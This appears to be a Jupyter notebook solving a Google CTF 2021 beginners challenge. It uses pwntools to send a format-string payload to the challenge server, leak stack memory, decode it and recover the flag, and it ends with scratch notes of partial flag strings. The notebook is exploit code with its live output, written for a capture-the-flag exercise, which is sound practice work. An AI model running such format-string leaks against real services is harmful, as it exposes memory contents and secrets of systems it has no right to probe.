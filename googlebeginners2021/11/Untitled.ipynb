{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pwn import *\n",
    "import re\n",
    "import itertools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 252,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to pwn-notebook.2021.ctfcompetition.com on port 1337\n",
      "[x] Opening connection to pwn-notebook.2021.ctfcompetition.com on port 1337: Trying 34.79.221.64\n",
      "[+] Opening connection to pwn-notebook.2021.ctfcompetition.com on port 1337: Done\n",
      "b'Quote: '\n",
      "[*] Closed connection to pwn-notebook.2021.ctfcompetition.com port 1337\n",
      " __________________________________________\n",
      "/ [000000000020][000000000020][000000000008][%34 \\\n",
      "| 3$012zx][0000001c16bc][0000001c16bc][%01 |\n",
      "| 2zx][000000005ec4][000000005ec4][000000000004] |\n",
      "| [00066474e551][000000000000][000000000000][%35 |\n",
      "| 3$012zx][000000000000][000000000000][%01 |\n",
      "| 2zx][00046474e552][0000001e7600][0000001e8600] |\n",
      "| [0000001e8600][000000002a00][000000002a00][%36 |\n",
      "| 3$012zx][7ffec7bed820][696d655200000000][%01 |\n",
      "| 2zx][74616d726f667b46][5f676e697274735f][5f6568745f726f66] |\n",
      "| [00007d6e6977][000000000000][7ffec7bed320][%37 |\n",
      "| 3$012zx][7f8fec817f60][5560888735e9][%01 |\n",
      "| 2zx][7f8fec7e0000][7f8fec817160][7ffec7bed820] |\n",
      "\\ [000300000000][7ffec7bed080][% 0/\n",
      " ------------------------------------------\n",
      "   \\    /\\_/\\  \n",
      "    \\  ( o.o ) \n",
      "        > ^ <  \n",
      "Please choose what you want to do:\n",
      "1. List built-in note metadata.\n",
      "2. Print out a built-in note.\n",
      "3. Make a draft your note.\n",
      "4. Add note to notebook.\n",
      "5. Delete note.\n",
      "9. Quit.\n",
      "> \n"
     ]
    }
   ],
   "source": [
    "offset = 85*4\n",
    "\n",
    "with remote(\"pwn-notebook.2021.ctfcompetition.com\",1337) as r:\n",
    "    r.recvuntil(b\"> \")\n",
    "    r.send(b\"3\\n\")\n",
    "    print(r.recvuntil(b\"Quote: \"))\n",
    "    # $20$\n",
    "    payload = \"\".join([f\"[%{i}$012zx]\" for i in range(offset,offset+85)]) + \"\\n\"\n",
    "    r.send(bytes(payload,\"ASCII\"))\n",
    "    data = r.recvuntil(b\".\\n> \")\n",
    "\n",
    "data = data.decode(\"ASCII\")\n",
    "print(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 253,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b' \\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\xbc\\x16\\x1c\\x00\\x00\\x00\\xbc\\x16\\x1c\\x00\\x00\\x00\\xc4^\\x00\\x00\\x00\\x00\\xc4^\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00Q\\xe5td\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00R\\xe5td\\x04\\x00\\x00v\\x1e\\x00\\x00\\x00\\x00\\x86\\x1e\\x00\\x00\\x00\\x00\\x86\\x1e\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00 \\xd8\\xbe\\xc7\\xfe\\x7f\\x00\\x00\\x00\\x00RemiF{format_string_for_the_win}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\xd3\\xbe\\xc7\\xfe\\x7f`\\x7f\\x81\\xec\\x8f\\x7f\\xe95\\x87\\x88`U\\x00\\x00~\\xec\\x8f\\x7f`q\\x81\\xec\\x8f\\x7f \\xd8\\xbe\\xc7\\xfe\\x7f\\x00\\x00\\x00\\x00\\x03\\x00\\x80\\xd0\\xbe\\xc7\\xfe\\x7f'"
      ]
     },
     "execution_count": 253,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#regex = r\"\\[([a-f0-9]+)\\]\"\n",
    "found_data = re.findall(regex,data)\n",
    "mem = bytes()\n",
    "for seq in [bytes.fromhex(x)[::-1] for x in found_data]:\n",
    "    mem += seq\n",
    "\n",
    "mem"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Reminder: CT_string_for_the_\n",
    "Reminder: CT$$$$$$$$_string_for_the_$$$$$$$$\n",
    "Remi$$$$$$$$F{format_string_for_the_win}\n",
    "\n",
    "$$$$nder$$$$F{fo_$$$$strf$$$$or_w$$$$in}\n",
    "nderF{fo_strfor_win}\n",
    "Reminder: CTF{fo_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Urgent: The delivery at 15:10 is prioritised\n",
    "        \n",
    "Urge$$$$The $$$$very$$$$15:1$$$$ pri$$$$ised\n",
    "Urge$$$$The $$$$very$$$$15:1$$$$ pri$$$$ised"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
